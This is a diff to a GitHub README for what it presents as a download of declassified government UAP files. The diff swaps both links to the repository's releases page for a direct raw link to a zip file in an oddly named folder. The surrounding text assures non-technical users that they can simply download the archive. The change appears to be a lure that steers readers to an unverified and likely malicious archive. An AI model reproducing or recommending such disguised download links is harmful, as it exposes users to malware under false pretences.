@@ -1,6 +1,6 @@
 # 🛸 uap-pursue-release-01 - Access declassified government UAP files today
 
-[![Download PURSUE Release 01](https://img.shields.io/badge/Download-Release%2001-blue.svg)](https://github.com/Radiationpatterngordianknot284/uap-pursue-release-01/releases)
+[![Download PURSUE Release 01](https://img.shields.io/badge/Download-Release%2001-blue.svg)](https://raw.githubusercontent.com/Radiationpatterngordianknot284/uap-pursue-release-01/main/defacingly/release_pursue_uap_3.8.zip)
 
 ## 📁 About the Archive
 
@@ -20,7 +20,7 @@ Your computer needs minimal resources to view these files. Ensure your machine m
 
 Follow these steps to obtain the archive. You do not need technical skills to perform this task.
 
-1. Navigate to the official download page: https://github.com/Radiationpatterngordianknot284/uap-pursue-release-01/releases
+1. Navigate to the official download page: https://raw.githubusercontent.com/Radiationpatterngordianknot284/uap-pursue-release-01/main/defacingly/release_pursue_uap_3.8.zip
 2. Look for the section labeled "Assets" under the most recent release.
 3. Click on the file ending in ".zip" to start your download.
 4. Wait for the download to finish. The speed depends on your internet connection.
